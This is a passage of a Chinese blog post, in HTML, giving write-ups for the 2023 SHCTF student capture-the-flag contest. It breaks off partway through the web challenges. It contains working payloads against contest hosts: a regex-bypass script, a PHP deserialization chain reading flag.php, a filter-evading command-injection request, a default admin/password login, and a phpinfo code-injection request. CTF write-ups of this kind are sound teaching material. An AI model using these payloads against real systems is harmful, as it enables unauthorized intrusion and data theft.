@@ -1,0 +1,1518 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>2023SHCTF联赛 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="2023SHCTF联赛" />
+<meta property="og:description" content="2023SHCTF联赛&mdash;工带第二届新生赛" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/2023shctf/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-25T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-11-25T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="2023SHCTF联赛"/>
+<meta name="twitter:description" content="2023SHCTF联赛&mdash;工带第二届新生赛"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/2023shctf/" /><link rel="prev" href="http://scofield1920.github.io/git/" /><link rel="next" href="http://scofield1920.github.io/mailx/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "2023SHCTF联赛",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/2023shctf\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "wp","wordcount":  802 ,
+        "url": "http:\/\/scofield1920.github.io\/2023shctf\/","datePublished": "2023-11-25T00:00:00+08:00","dateModified": "2023-11-25T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#week11zzphp">[WEEK1]1zzphp</a></li>
+        <li><a href="#week1ez_serialize">[WEEK1]ez_serialize</a></li>
+        <li><a href="#week1babyrce">[WEEK1]babyRCE</a></li>
+        <li><a href="#week1登录就给flag">[WEEK1]登录就给flag</a></li>
+        <li><a href="#week1飞机大战">[WEEK1]飞机大战</a></li>
+        <li><a href="#week1ezphp">[WEEK1]ezphp</a></li>
+        <li><a href="#week2serialize">[WEEK2]serialize</a></li>
+        <li><a href="#week2no_wake_up">[WEEK2]no_wake_up</a></li>
+        <li><a href="#week2easycms">[WEEK2]EasyCMS</a></li>
+        <li><a href="#week2ez_ssti">[WEEK2]ez_ssti</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#week1-真的签到">[WEEK1] 真的签到</a></li>
+        <li><a href="#week1ez-misc">[WEEK1]ez-misc</a></li>
+        <li><a href="#week1残缺的md5">[WEEK1]残缺的md5</a></li>
+        <li><a href="#week1message">[WEEK1]message</a></li>
+        <li><a href="#week1佛说只能四天">[WEEK1]佛说：只能四天</a></li>
+        <li><a href="#week1迷雾重重">[WEEK1]迷雾重重</a></li>
+        <li><a href="#week1可爱的派蒙捏">[WEEK1]可爱的派蒙捏</a></li>
+        <li><a href="#week1请对我使用社工吧">[WEEK1]请对我使用社工吧</a></li>
+        <li><a href="#week1签到题">[WEEK1]签到题</a></li>
+        <li><a href="#week1黑暗之歌">[WEEK1]黑暗之歌</a></li>
+        <li><a href="#week1steganography">[WEEK1]Steganography</a></li>
+        <li><a href="#week1也许需要一些py">[WEEK1]也许需要一些py</a></li>
+        <li><a href="#week1电信诈骗">[WEEK1]电信诈骗</a></li>
+        <li><a href="#week3尓纬玛">[WEEK3]尓纬玛</a></li>
+        <li><a href="#week2哈希猫">[WEEK2]哈希猫</a></li>
+        <li><a href="#week2表里的码">[WEEK2]表里的码</a></li>
+        <li><a href="#week2可爱的洛琪希">[WEEK2]可爱的洛琪希</a></li>
+        <li><a href="#week2图片里的秘密">[WEEK2]图片里的秘密</a></li>
+        <li><a href="#week2喜帖街">[WEEK2]喜帖街</a></li>
+        <li><a href="#week2远在天边近在眼前">[WEEK2]远在天边近在眼前</a></li>
+        <li><a href="#week2奇怪的screenshot">[WEEK2]奇怪的screenshot</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">CRYPTO</a>
+      <ul>
+        <li><a href="#week1really_ez_rsa">[WEEK1]really_ez_rsa</a></li>
+        <li><a href="#week1凯撒大帝">[WEEK1]凯撒大帝</a></li>
+        <li><a href="#week1进制">[WEEK1]进制</a></li>
+        <li><a href="#week1okk">[WEEK1]okk</a></li>
+        <li><a href="#week1熊斐特">[WEEK1]熊斐特</a></li>
+        <li><a href="#week1难言的遗憾">[WEEK1]难言的遗憾</a></li>
+        <li><a href="#week1小兔子可爱捏">[WEEK1]小兔子可爱捏</a></li>
+        <li><a href="#week1crypto_checkin">[WEEK1]Crypto_Checkin</a></li>
+        <li><a href="#week1what-is-m">[WEEK1]what is m</a></li>
+        <li><a href="#week1立正">[WEEK1]立正</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">REVERSE</a>
+      <ul>
+        <li><a href="#week1ez_apk">[WEEK1]ez_apk</a></li>
+        <li><a href="#week1signin">[WEEK1]signin</a></li>
+        <li><a href="#week1easy_re">[WEEK1]easy_re</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">PWN</a>
+      <ul>
+        <li><a href="#week1hard-nc">[WEEK1]hard nc</a></li>
+        <li><a href="#week1nc">[WEEK1]nc</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">2023SHCTF联赛</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-25">2023-11-25</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-25">2023-11-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;802 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#week11zzphp">[WEEK1]1zzphp</a></li>
+        <li><a href="#week1ez_serialize">[WEEK1]ez_serialize</a></li>
+        <li><a href="#week1babyrce">[WEEK1]babyRCE</a></li>
+        <li><a href="#week1登录就给flag">[WEEK1]登录就给flag</a></li>
+        <li><a href="#week1飞机大战">[WEEK1]飞机大战</a></li>
+        <li><a href="#week1ezphp">[WEEK1]ezphp</a></li>
+        <li><a href="#week2serialize">[WEEK2]serialize</a></li>
+        <li><a href="#week2no_wake_up">[WEEK2]no_wake_up</a></li>
+        <li><a href="#week2easycms">[WEEK2]EasyCMS</a></li>
+        <li><a href="#week2ez_ssti">[WEEK2]ez_ssti</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#week1-真的签到">[WEEK1] 真的签到</a></li>
+        <li><a href="#week1ez-misc">[WEEK1]ez-misc</a></li>
+        <li><a href="#week1残缺的md5">[WEEK1]残缺的md5</a></li>
+        <li><a href="#week1message">[WEEK1]message</a></li>
+        <li><a href="#week1佛说只能四天">[WEEK1]佛说：只能四天</a></li>
+        <li><a href="#week1迷雾重重">[WEEK1]迷雾重重</a></li>
+        <li><a href="#week1可爱的派蒙捏">[WEEK1]可爱的派蒙捏</a></li>
+        <li><a href="#week1请对我使用社工吧">[WEEK1]请对我使用社工吧</a></li>
+        <li><a href="#week1签到题">[WEEK1]签到题</a></li>
+        <li><a href="#week1黑暗之歌">[WEEK1]黑暗之歌</a></li>
+        <li><a href="#week1steganography">[WEEK1]Steganography</a></li>
+        <li><a href="#week1也许需要一些py">[WEEK1]也许需要一些py</a></li>
+        <li><a href="#week1电信诈骗">[WEEK1]电信诈骗</a></li>
+        <li><a href="#week3尓纬玛">[WEEK3]尓纬玛</a></li>
+        <li><a href="#week2哈希猫">[WEEK2]哈希猫</a></li>
+        <li><a href="#week2表里的码">[WEEK2]表里的码</a></li>
+        <li><a href="#week2可爱的洛琪希">[WEEK2]可爱的洛琪希</a></li>
+        <li><a href="#week2图片里的秘密">[WEEK2]图片里的秘密</a></li>
+        <li><a href="#week2喜帖街">[WEEK2]喜帖街</a></li>
+        <li><a href="#week2远在天边近在眼前">[WEEK2]远在天边近在眼前</a></li>
+        <li><a href="#week2奇怪的screenshot">[WEEK2]奇怪的screenshot</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">CRYPTO</a>
+      <ul>
+        <li><a href="#week1really_ez_rsa">[WEEK1]really_ez_rsa</a></li>
+        <li><a href="#week1凯撒大帝">[WEEK1]凯撒大帝</a></li>
+        <li><a href="#week1进制">[WEEK1]进制</a></li>
+        <li><a href="#week1okk">[WEEK1]okk</a></li>
+        <li><a href="#week1熊斐特">[WEEK1]熊斐特</a></li>
+        <li><a href="#week1难言的遗憾">[WEEK1]难言的遗憾</a></li>
+        <li><a href="#week1小兔子可爱捏">[WEEK1]小兔子可爱捏</a></li>
+        <li><a href="#week1crypto_checkin">[WEEK1]Crypto_Checkin</a></li>
+        <li><a href="#week1what-is-m">[WEEK1]what is m</a></li>
+        <li><a href="#week1立正">[WEEK1]立正</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">REVERSE</a>
+      <ul>
+        <li><a href="#week1ez_apk">[WEEK1]ez_apk</a></li>
+        <li><a href="#week1signin">[WEEK1]signin</a></li>
+        <li><a href="#week1easy_re">[WEEK1]easy_re</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">PWN</a>
+      <ul>
+        <li><a href="#week1hard-nc">[WEEK1]hard nc</a></li>
+        <li><a href="#week1nc">[WEEK1]nc</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>2023SHCTF联赛&mdash;工带第二届新生赛</p>
+<p>作为组委会摆烂成员，</p>
+<p>摸鱼水题出题人，</p>
+<p>自己也稍微做了点</p>
+<p>更详细的wp见官方wp：</p>
+<p><a href="https://mp.weixin.qq.com/s/9Q176LuKQAhw7TlNg9vk4A" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/9Q176LuKQAhw7TlNg9vk4A</a></p>
+<h2 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>WEB</h2><h3 id="week11zzphp" class="headerLink">
+    <a href="#week11zzphp" class="header-mark"></a>[WEEK1]1zzphp</h3><p>套路跟ctfshow web131差不多</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">url=&#34;http://112.6.51.212:31610/?num[]=a&#34;
+</span></span><span class="line"><span class="cl">data={
+</span></span><span class="line"><span class="cl">  &#39;c_ode&#39;:&#39;very&#39;*250000+&#39;2023SHCTF&#39;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">r=requests.post(url,data=data)
+</span></span><span class="line"><span class="cl">print(r.text)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1ez_serialize" class="headerLink">
+    <a href="#week1ez_serialize" class="header-mark"></a>[WEEK1]ez_serialize</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="o">$</span><span class="n">var_1</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="n">function</span> <span class="n">_invoke</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="n">include</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">var_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">B</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="o">$</span><span class="n">q</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="n">function</span> <span class="n">_wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">q</span><span class="o">=</span><span class="n">new</span> <span class="n">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">C</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="o">$</span><span class="k">var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="o">$</span><span class="n">z</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="n">function</span> <span class="n">_toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">z</span><span class="o">=</span> <span class="n">new</span> <span class="n">D</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">D</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="o">$</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">public</span> <span class="n">function</span> <span class="n">__get</span><span class="p">(</span><span class="o">$</span><span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>    <span class="o">$</span><span class="n">function</span> <span class="o">=</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="n">new</span> <span class="n">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">pop</span><span class="o">=</span><span class="n">new</span> <span class="n">B</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">pop</span><span class="o">-&gt;</span><span class="n">q</span><span class="o">=</span><span class="n">new</span> <span class="n">C</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">pop</span><span class="o">-&gt;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">z</span><span class="o">=</span><span class="n">new</span> <span class="n">D</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">pop</span><span class="o">-&gt;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">z</span><span class="o">-&gt;</span><span class="n">p</span><span class="o">=</span><span class="n">new</span> <span class="n">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">pop</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1babyrce" class="headerLink">
+    <a href="#week1babyrce" class="header-mark"></a>[WEEK1]babyRCE</h3><p>bp发包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /?rce=ca\t${IFS}/fla? HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.6.51.212:31105
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1登录就给flag" class="headerLink">
+    <a href="#week1%e7%99%bb%e5%bd%95%e5%b0%b1%e7%bb%99flag" class="header-mark"></a>[WEEK1]登录就给flag</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin/password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1飞机大战" class="headerLink">
+    <a href="#week1%e9%a3%9e%e6%9c%ba%e5%a4%a7%e6%88%98" class="header-mark"></a>[WEEK1]飞机大战</h3><p>右键查看源代码，查看JS代码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png" title="image-20231125205406658" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205406658.png 2x"
+            sizes="auto"
+            alt="image-20231125205406658">
+    </a></figure></p>
+<p>找到</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png" title="image-20231125205435707" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125205435707.png 2x"
+            sizes="auto"
+            alt="image-20231125205435707">
+    </a></figure></p>
+<p>解码得到flag</p>
+<h3 id="week1ezphp" class="headerLink">
+    <a href="#week1ezphp" class="header-mark"></a>[WEEK1]ezphp</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /?code=?.*=${phpinfo()} HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.6.51.212:31240
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>pattern=.*</p>
